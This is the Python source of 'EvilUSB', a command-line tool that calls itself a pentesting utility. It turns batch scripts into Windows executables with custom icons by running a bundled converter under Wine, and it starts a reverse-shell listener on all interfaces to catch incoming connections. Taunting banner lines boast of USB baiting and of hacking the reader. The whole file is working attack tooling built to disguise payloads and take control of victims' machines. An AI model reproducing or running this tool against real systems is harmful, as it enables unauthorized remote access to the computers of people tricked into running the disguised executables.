import os
import shutil
import random
import argparse
import subprocess
from utils.log import Log
import ReverseShellManager


Log.ascii('''
   _   ,--()
  ( )-'-.------|>
   "     `--[]

EvilUSB\t''')

start = ["Oops, I think I dropped something", "Arrg, this fricking USB never inserts at 1st try", "Sssh, do you hear that? We have baited them", "Wut u doing bru? Do ur red team stuff and stop reading this!", "While you read this you are being hacked. Haha!", "All shells belongs to me!"]

Log.phrases(random.choice(start))

parser = argparse.ArgumentParser(description="EvilUSB: Quick utility to craft executables for pentesting and managing reverse shells.")
parser.add_argument("-b", "--bat", help="Path to bat file")
parser.add_argument("-i", "--icon", help="Path to icon file (.ico)")
parser.add_argument("-o", "--output", help="Path to exe output")
parser.add_argument("-t", "--target", help="Set 32 or 64 for platform architecture", default=32)
parser.add_argument("-l", "--listen", help="Listen for incoming connections", action='store_true')
parser.add_argument("-p", "--port", help="Listening port", default=4444)
args = parser.parse_args()

if args.listen:
    ReverseShellManager.main("0.0.0.0", args.port)
elif args.bat != None and args.output!= None:
    if shutil.which("wine") == None:
        Log.error("Wine not found!")
        exit()

    if args.target != 32 and args.target != 64:
        Log.error("Invalid target. Only 32 and 64!")
        exit()

    target = "./bin/b2ec32.exe" if args.target == 32 else "./bin/b2ec64.exe"

    Log.success("Crafting {0} into {1}".format(args.bat, args.output))
    command = ["wine", target, "/bat", args.bat, "/exe", args.output]
    if args.icon != None:
        command.append("/icon")
        command.append(args.icon)
    res = subprocess.run(command, stdout=subprocess.PIPE)
    phases = res.stdout.decode("utf8").split("\n")
    for phase in phases:
        if len(phase) > 2 and not "Process finished" in phase:
            Log.success("{0}".format(phase))
        else:
            print("")

    print("\033[1;32m[*] \033[35mDone! (ﾉﾟ0ﾟ)ﾉ~\033[0m")
else:
    parser.print_help()
